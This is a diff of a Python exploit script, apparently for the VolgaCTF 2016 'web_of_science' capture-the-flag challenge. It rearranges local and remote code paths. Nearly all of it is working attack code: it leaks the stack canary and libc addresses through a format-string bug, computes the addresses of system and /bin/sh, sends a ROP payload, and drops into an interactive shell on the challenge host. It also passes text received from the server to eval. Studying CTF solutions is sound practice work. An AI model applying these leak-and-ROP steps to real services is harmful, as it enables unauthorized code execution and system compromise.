@@ -115,54 +115,101 @@ if local:
     p = process("./web_of_science")
     pause()
     p.debug()
+    p.recvl()
+    p.sendl("Hello")
+    p.recvl()
+    p.recvl()
+    for i in range(10):
+	    buf = p.recvl()
+	    buf = buf.replace(" = ?","",1).strip("\n")
+	    buf = str(eval(buf))
+	    print "Answer: " + buf
+	    p.recvul(":")
+	    p.sendl(buf)
+	    p.recvl()
+    #addpaper
+    p.recvul(">")
+    p.sendl("1")
+    p.recvl()
+    addpaper(p,"1")
+    addpaper(p,"2")
+    addpaper(p,"3")
+    addpaper(p,"s")
+    p.recvul(">")
+    #read paper
+    p.sendl("5")
+    p.recvl()
+    p.recvul("Abstract:")
+    p.recvl()
+    #leak
+    buf = p.recvl()
+    buf = int(buf[16:30],16)
+    system = buf-0x37a3a0
+    binsh = buf-0x243d05
+    p.recvul(">")
+    p.sendl("6")
+    canary = int(viewpaper(p),16)
+    print green("System: "),hex(system)
+    print green("Binsh: "),hex(binsh)
+    print green("Canary: "),hex(canary)
+    #fucking exploit
+    p.recvul(">")
+    p.sendl("4")
+    p.recvul(":")
+    p.sendl("0")
+    p.recvul(">")
+    p.sendl("1")
+    addpaper(p,"e",canary,system,binsh)
+    p.recvul(">")
+    p.sendl("6")
+    p.interactive()
 else:
     HOST = "webofscience.2016.volgactf.ru"
     PORT = 45678
     p = connect(HOST,PORT)
     pause()
     p.debug()
+    p.recvl()
+    p.sendl("Hello")
+    p.recvl()
+    for i in range(10):
+	    buf = p.recvl()
+	    buf = buf.replace(" = ?","",1).strip("\n")
+	    buf = str(eval(buf))
+	    print "Answer: " + buf
+	    p.recvul(":")
+	    p.sendl(buf)
+
+    p.recvul(">")
+    p.sendl("1")
+    p.recvl()
+    addpaper(p,"1")
+    addpaper(p,"2")
+    addpaper(p,"3")
+    addpaper(p,"s")
+    p.recvul(">")
+    p.sendl("5")
+    p.recvl()
+    p.recvul("Abstract:")
+    p.recvl()
+    buf = p.recvl()
+    buf = int(buf[145:156],16)
+    print buf
+    #fucking exploit
+    p.recvul(">")
+    p.sendl("4")
+    p.recvul(":")
+    p.sendl("0")
+    p.recvul(">")
+    p.sendl("1")
+    addpaper(p,"e",canary,buf)
+    p.recvul(">")
+    p.sendl("6")
+    p.interactive()
 
 #=========================================================
 
-p.recvl()
-p.sendl("Hello")
-p.recvl()
-for i in range(10):
-    buf = p.recvl()
-    buf = buf.replace(" = ?","",1).strip("\n")
-    buf = str(eval(buf))
-    print "Answer: " + buf
-    p.recvul(":")
-    p.sendl(buf)
 
-
-p.recvul(">")
-p.sendl("1")
-p.recvl()
-addpaper(p,"1")
-addpaper(p,"2")
-addpaper(p,"3")
-addpaper(p,"s")
-p.recvul(">")
-p.sendl("5")
-p.recvl()
-p.recvul("Abstract:")
-p.recvl()
-buf = p.recvl()
-buf = int(buf[145:156],16)
-print buf
-
-#fucking exploit
-p.recvul(">")
-p.sendl("4")
-p.recvul(":")
-p.sendl("0")
-p.recvul(">")
-p.sendl("1")
-addpaper(p,"e",canary,buf)
-p.recvul(">")
-p.sendl("6")
-p.interactive()
 
 """
 #rop works for both 1 and 2. 
@@ -170,61 +217,6 @@ p.interactive()
 #Only few difference between first and second. You still can leak using format vuln and they added the category "url" and "size" in add paper function
 
 
-p.recvl()
-p.sendl("Hello")
-p.recvl()
-p.recvl()
-for i in range(10):
-    buf = p.recvl()
-    buf = buf.replace(" = ?","",1).strip("\n")
-    buf = str(eval(buf))
-    print "Answer: " + buf
-    p.recvul(":")
-    p.sendl(buf)
-    p.recvl()
-
-
-#addpaper
-p.recvul(">")
-p.sendl("1")
-p.recvl()
-addpaper(p,"1")
-addpaper(p,"2")
-addpaper(p,"3")
-addpaper(p,"s")
-p.recvul(">")
-
-#read paper
-p.sendl("5")
-p.recvl()
-p.recvul("Abstract:")
-p.recvl()
-
-#leak
-buf = p.recvl()
-buf = int(buf[16:30],16)
-system = buf-0x37a3a0
-binsh = buf-0x243d05
-p.recvul(">")
-p.sendl("6")
-canary = int(viewpaper(p),16)
-
-print green("System: "),hex(system)
-print green("Binsh: "),hex(binsh)
-print green("Canary: "),hex(canary)
-print shellcode
-
-#fucking exploit
-p.recvul(">")
-p.sendl("4")
-p.recvul(":")
-p.sendl("0")
-p.recvul(">")
-p.sendl("1")
-addpaper(p,"e",canary,system,binsh)
-p.recvul(">")
-p.sendl("6")
-p.interactive()
 """
 
 
